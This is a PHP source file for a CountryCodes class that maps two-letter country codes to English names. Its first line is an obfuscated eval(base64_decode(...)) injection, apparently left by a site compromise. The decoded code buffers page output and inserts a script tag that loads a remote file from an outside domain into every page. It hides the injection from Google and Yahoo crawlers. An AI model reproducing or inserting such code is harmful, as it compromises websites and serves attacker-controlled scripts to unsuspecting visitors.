<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php

  /**
  * Class that lists all available countries at the moment with their codes and english names
  *
  * @version 1.0
  * @author Ilija Studen <ilija.studen@gmail.com>
  */
  class CountryCodes {
  
    /**
    * Countries array
    *
    * @var array
    */
    static $countries = array(
      'us' => 'United States',
      'ca' => 'Canada',
      'af' => 'Afghanistan',
      'al' => 'Albania',
      'dz' => 'Algeria',
      'as' => 'American Samoa',
      'ad' => 'Andorra',
      'ao' => 'Angola',
      'ai' => 'Anguilla',
      'aq' => 'Antarctica',
      'ag' => 'Antigua and Barbuda',
      'ar' => 'Argentina',
      'am' => 'Armenia',
      'aw' => 'Aruba',
      'au' => 'Australia',
      'at' => 'Austria',
      'az' => 'Azerbaijan',
      'bs' => 'Bahamas',
      'bh' => 'Bahrain',
      'bd' => 'Bangladesh',
      'bb' => 'Barbados',
      'by' => 'Belarus',
      'be' => 'Belgium',
      'bz' => 'Belize',
      'bj' => 'Benin',
      'bm' => 'Bermuda',
      'bt' => 'Bhutan',
      'bo' => 'Bolivia',
      'ba' => 'Bosnia and Herzegovina',
      'bw' => 'Botswana',
      'bv' => 'Bouvet Island',
      'br' => 'Brazil',
      'io' => 'British Indian Ocean Territory',
      'vg' => 'British Virgin Islands',
      'bn' => 'Brunei',
      'bg' => 'Bulgaria',
      'bf' => 'Burkina Faso',
      'bi' => 'Burundi',
      'kh' => 'Cambodia',
      'cm' => 'Cameroon',
      'cv' => 'Cape Verde',
      'ky' => 'Cayman Islands',
      'cf' => 'Central African Republic',
      'td' => 'Chad',
      'cl' => 'Chile',
      'cn' => 'China',
      'cx' => 'Christmas Island',
      'cc' => 'Cocos Islands',
      'co' => 'Colombia',
      'km' => 'Comoros',
      'cg' => 'Congo',
      'ck' => 'Cook Islands',
      'cr' => 'Costa Rica',
      'hr' => 'Croatia',
      'cu' => 'Cuba',
      'cy' => 'Cyprus',
      'cz' => 'Czech Republic',
      'dk' => 'Denmark',
      'dj' => 'Djibouti',
      'dm' => 'Dominica',
      'do' => 'Dominican Republic',
      'tp' => 'East Timor',
      'ec' => 'Ecuador',
      'eg' => 'Egypt',
      'sv' => 'El Salvador',
      'gq' => 'Equatorial Guinea',
      'er' => 'Eritrea',
      'ee' => 'Estonia',
      'et' => 'Ethiopia',
      'fk' => 'Falkland Islands',
      'fo' => 'Faroe Islands',
      'fj' => 'Fiji',
      'fi' => 'Finland',
      'fr' => 'France',
      'gf' => 'French Guiana',
      'pf' => 'French Polynesia',
      'tf' => 'French Southern Territories',
      'ga' => 'Gabon',
      'gm' => 'Gambia',
      'ge' => 'Georgia',
      'de' => 'Germany',
      'gh' => 'Ghana',
      'gi' => 'Gibraltar',
      'gr' => 'Greece',
      'gl' => 'Greenland',
      'gd' => 'Grenada',
      'gp' => 'Guadeloupe',
      'gu' => 'Guam',
      'gt' => 'Guatemala',
      'gn' => 'Guinea',
      'gw' => 'Guinea-Bissau',
      'gy' => 'Guyana',
      'ht' => 'Haiti',
      'hm' => 'Heard and McDonald Islands',
      'hn' => 'Honduras',
      'hk' => 'Hong Kong',
      'hu' => 'Hungary',
      'is' => 'Iceland',
      'in' => 'India',
      'id' => 'Indonesia',
      'ir' => 'Iran',
      'iq' => 'Iraq',
      'ie' => 'Ireland',
      'il' => 'Israel',
      'it' => 'Italy',
      'ci' => 'Ivory Coast',
      'jm' => 'Jamaica',
      'jp' => 'Japan',
      'jo' => 'Jordan',
      'kz' => 'Kazakhstan',
      'ke' => 'Kenya',
      'ki' => 'Kiribati',
      'kp' => 'North Korea',
      'kr' => 'South Korea',
      'kw' => 'Kuwait',
      'kg' => 'Kyrgyzstan',
      'la' => 'Laos',
      'lv' => 'Latvia',
      'lb' => 'Lebanon',
      'ls' => 'Lesotho',
      'lr' => 'Liberia',
      'ly' => 'Libya',
      'li' => 'Liechtenstein',
      'lt' => 'Lithuania',
      'lu' => 'Luxembourg',
      'mo' => 'Macau',
      'mk' => 'Macedonia',
      'mg' => 'Madagascar',
      'mw' => 'Malawi',
      'my' => 'Malaysia',
      'mv' => 'Maldives',
      'ml' => 'Mali',
      'mt' => 'Malta',
      'mh' => 'Marshall Islands',
      'mq' => 'Martinique',
      'mr' => 'Mauritania',
      'mu' => 'Mauritius',
      'yt' => 'Mayotte',
      'mx' => 'Mexico',
      'fm' => 'Micronesia',
      'md' => 'Moldova',
      'mc' => 'Monaco',
      'mn' => 'Mongolia',
      'me' => 'Montenegro',
      'ms' => 'Montserrat',
      'ma' => 'Morocco',
      'mz' => 'Mozambique',
      'mm' => 'Myanmar',
      'na' => 'Namibia',
      'nr' => 'Nauru',
      'np' => 'Nepal',
      'nl' => 'Netherlands',
      'an' => 'Netherlands Antilles',
      'nc' => 'New Caledonia',
      'nz' => 'New Zealand',
      'ni' => 'Nicaragua',
      'ne' => 'Niger',
      'ng' => 'Nigeria',
      'nu' => 'Niue',
      'nf' => 'Norfolk Island',
      'mp' => 'Northern Mariana Islands',
      'no' => 'Norway',
      'om' => 'Oman',
      'pk' => 'Pakistan',
      'pw' => 'Palau',
      'pa' => 'Panama',
      'pg' => 'Papua New Guinea',
      'py' => 'Paraguay',
      'pe' => 'Peru',
      'ph' => 'Philippines',
      'pn' => 'Pitcairn Island',
      'pl' => 'Poland',
      'pt' => 'Portugal',
      'pr' => 'Puerto Rico',
      'qa' => 'Qatar',
      're' => 'Reunion',
      'ro' => 'Romania',
      'ru' => 'Russia',
      'rw' => 'Rwanda',
      'gs' => 'S. Georgia and S. Sandwich Isls.',
      'kn' => 'Saint Kitts & Nevis',
      'lc' => 'Saint Lucia',
      'vc' => 'Saint Vincent and The Grenadines',
      'ws' => 'Samoa',
      'sm' => 'San Marino',
      'st' => 'Sao Tome and Principe',
      'sa' => 'Saudi Arabia',
      'sn' => 'Senegal',
      'rs' => 'Serbia',
      'sc' => 'Seychelles',
      'sl' => 'Sierra Leone',
      'sg' => 'Singapore',
      'sk' => 'Slovakia',
      'si' => 'Slovenia',
      'sb' => 'Solomon Islands',
      'so' => 'Somalia',
      'za' => 'South Africa',
      'es' => 'Spain',
      'lk' => 'Sri Lanka',
      'sh' => 'St. Helena',
      'pm' => 'St. Pierre and Miquelon',
      'sd' => 'Sudan',
      'sr' => 'Suriname',
      'sj' => 'Svalbard and Jan Mayen Islands',
      'sz' => 'Swaziland',
      'se' => 'Sweden',
      'ch' => 'Switzerland',
      'sy' => 'Syria',
      'tw' => 'Taiwan',
      'tj' => 'Tajikistan',
      'tz' => 'Tanzania',
      'th' => 'Thailand',
      'tg' => 'Togo',
      'tk' => 'Tokelau',
      'to' => 'Tonga',
      'tt' => 'Trinidad and Tobago',
      'tn' => 'Tunisia',
      'tr' => 'Turkey',
      'tm' => 'Turkmenistan',
      'tc' => 'Turks and Caicos Islands',
      'tv' => 'Tuvalu',
      'um' => 'U.S. Minor Outlying Islands',
      'ug' => 'Uganda',
      'ua' => 'Ukraine',
      'ae' => 'United Arab Emirates',
      'uk' => 'United Kingdom',
      'uy' => 'Uruguay',
      'uz' => 'Uzbekistan',
      'vu' => 'Vanuatu',
      'va' => 'Vatican City',
      've' => 'Venezuela',
      'vn' => 'Vietnam',
      'vi' => 'Virgin Islands',
      'wf' => 'Wallis and Futuna Islands',
      'eh' => 'Western Sahara',
      'ye' => 'Yemen',
      'zr' => 'Zaire',
      'zm' => 'Zambia',
      'zw' => 'Zimbabwe'
    ); // array
    
    /**
    * Return array of countries
    *
    * @access public
    * @param void
    * @return array
    */
    function getAll() {
      return self::$countries;
    } // getAll
    
    /**
    * Find specific country by country code
    *
    * @access public
    * @param string $code
    * @return string
    */
    function getCountryNameByCode($code) {
      return array_var(self::$countries, $code);
    } // getCountryNameByCode
  
  } // CountryCodes

?>